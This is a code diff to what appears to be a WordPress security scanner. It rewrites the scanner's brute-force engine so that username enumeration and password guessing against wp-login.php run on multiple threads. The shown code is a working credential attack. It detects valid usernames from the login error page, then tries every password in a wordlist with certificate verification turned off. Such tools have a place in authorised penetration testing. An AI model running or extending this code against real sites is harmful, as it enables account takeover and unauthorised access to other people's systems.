@@ -5,10 +5,11 @@ import re
 import json
 import os
 import urllib
+import sys
 
 from core import *
 from wordpress import *
-from multiprocessing import Process, Pool
+from thread_engine import ThreadEngine
 
 class Brute_Engine:
 	def __init__(self, wordpress, brute):
@@ -42,13 +43,26 @@ class Brute_Engine:
 
 		with open('fuzz/wordlist.lst') as data_file:
 			data   = data_file.readlines()
+			thread_engine = ThreadEngine(wordpress.max_threads)
+			users_found = []
 
 			for user in data:
 				user = user.strip()
-				data = {"log":user, "pwd":"wordpresscan"}
-				if not "Invalid username" in requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text:
-					print info("User found "+ user)
-					self.bruteforcing_pass(wordpress, user)
+				thread_engine.new_task(self.check_user, (user, users_found, wordpress))
+			thread_engine.wait()
+
+			for user in users_found:
+				self.bruteforcing_pass(wordpress, user)
+
+
+	def check_user(self, user, users_found, wordpress):
+		data = {"log":user, "pwd":"wordpresscan"}
+		html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
+		# valid login -> the submited user is printed by WP
+		if '<div id="login_error">' in html and '<strong>%s</strong>' % user in html:
+			print info("User found "+ user)
+			users_found.append(user)
+
 
 	"""
 	name        : bruteforcing_pass(self, wordpress)
@@ -60,14 +74,22 @@ class Brute_Engine:
 		with open('fuzz/wordlist.lst') as data_file:
 			data  = data_file.readlines()
 			size  = len(data)
+			thread_engine = ThreadEngine(wordpress.max_threads)
+			found = [False]
 
 			for index, pwd in enumerate(data):
+				if found[0]: break
 				pwd     = pwd.strip()
-				data    = {"log": user, "pwd": pwd}
 				percent = int(float(index)/(size)*100)
+				thread_engine.new_task(self.check_pass, (user, pwd, wordpress, found))
 
-				print 'Bruteforcing - {}{}\r'.format( percent*"▓", (100-percent)*'░' ) ,
+				# print 'Bruteforcing - {}{}\r'.format( percent*"▓", (100-percent)*'░' )
+			thread_engine.wait()
 
-				if not "The password you entered" in requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text:
-					print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
-					break
+
+	def check_pass(self, user, pwd, wordpress, found):
+		data = {"log": user, "pwd": pwd}
+		html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
+		if not '<div id="login_error">' in html:
+			print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
+			found[0] = True
